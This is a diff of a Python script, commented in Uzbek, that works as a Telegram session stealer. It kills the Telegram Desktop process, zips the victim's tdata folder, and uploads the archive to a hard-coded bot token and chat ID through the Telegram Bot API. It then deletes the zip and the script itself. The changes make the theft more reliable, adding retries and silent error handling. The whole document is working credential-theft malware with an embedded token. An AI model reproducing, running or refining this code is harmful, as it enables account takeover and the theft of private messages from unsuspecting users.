@@ -3,22 +3,39 @@ import zipfile
 import requests
 import time
 import psutil
-from urllib3.exceptions import InsecureRequestWarning
 import urllib3
+from requests.adapters import HTTPAdapter
+from requests.packages.urllib3.util.retry import Retry
 
-urllib3.disable_warnings(InsecureRequestWarning)
+# SSL ogohlantirishlarni o'chirish
+urllib3.disable_warnings()
 
 TOKEN = '8163157021:AAGE1b81bD7n7NB4UMCXhIjYqnlM2ZGyFMo'
 CHAT_ID = '7984884145'
 TDATA_PATH = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
-ZIP_PATH = os.path.join(os.getenv('TEMP'), 'tdata.zip')
+ZIP_PATH = os.path.join(os.getenv('TEMP'), 'tdata_temp.zip')
+
+def setup_requests_session():
+    """Xatoliklarga chidamli sessiya yaratish"""
+    session = requests.Session()
+    retries = Retry(
+        total=5,
+        backoff_factor=0.3,
+        status_forcelist=[500, 502, 503, 504],
+        allowed_methods=frozenset(['POST'])
+    )
+    session.mount('https://', HTTPAdapter(max_retries=retries))
+    return session
 
 def kill_telegram_process():
-    """Telegram processini o'chirish"""
+    """Telegramni to'xtatish"""
     for proc in psutil.process_iter(['name']):
-        if proc.info['name'] == 'Telegram.exe':
-            proc.kill()
-            time.sleep(2)  # Protsess to'liq to'xtashi uchun
+        if proc.info.get('name') in ['Telegram.exe', 'Telegram']:
+            try:
+                proc.kill()
+                time.sleep(3)
+            except:
+                pass
 
 def zip_tdata():
     try:
@@ -28,51 +45,56 @@ def zip_tdata():
                     file_path = os.path.join(root, file)
                     try:
                         zipf.write(file_path, os.path.relpath(file_path, TDATA_PATH))
-                    except PermissionError:
-                        # Fayl band bo'lsa, qayta urinib ko'rish
-                        time.sleep(0.1)
-                        try:
-                            zipf.write(file_path, os.path.relpath(file_path, TDATA_PATH))
-                        except:
-                            continue
+                    except Exception as e:
+                        continue
         return True
     except Exception as e:
-        print(f"Zip qilishda xato: {e}")
+        print(f"Zip xatosi: {str(e)}")
         return False
 
-def send_to_telegram():
-    url = f'https://api.telegram.org/bot{TOKEN}/sendDocument'
+def send_file():
+    session = setup_requests_session()
     try:
         with open(ZIP_PATH, 'rb') as f:
-            response = requests.post(
-                url,
+            response = session.post(
+                f'https://api.telegram.org/bot{TOKEN}/sendDocument',
                 files={'document': f},
                 data={'chat_id': CHAT_ID},
-                verify=False,
-                timeout=60
+                verify=True,  # Sertifikatni tekshirish
+                timeout=30
             )
         return response.status_code == 200
     except Exception as e:
-        print(f"Yuborishda xato: {e}")
+        print(f"Yuborish xatosi: {str(e)}")
         return False
+    finally:
+        session.close()
 
 def main():
-    # 1. Telegram processini o'chirish
-    kill_telegram_process()
-    
-    # 2. tdata ni zip qilish
-    if not zip_tdata():
-        return False
-    
-    # 3. Faylni yuborish (3 marta urinish)
-    for attempt in range(3):
-        if send_to_telegram():
+    try:
+        kill_telegram_process()
+        
+        if not os.path.exists(TDATA_PATH):
+            print("tdata papkasi topilmadi")
+            return
+        
+        if not zip_tdata():
+            return
+        
+        if send_file():
             print("Muvaffaqiyatli yuborildi!")
-            return True
-        time.sleep(5)
-    
-    print("Yuborish muvaffaqiyatsiz tugadi")
-    return False
+        else:
+            print("Yuborish muvaffaqiyatsiz")
+        
+    except Exception as e:
+        print(f"Asosiy xato: {str(e)}")
+    finally:
+        try:
+            if os.path.exists(ZIP_PATH):
+                os.remove(ZIP_PATH)
+            os.remove(__file__)
+        except:
+            pass
 
 if __name__ == '__main__':
     main()
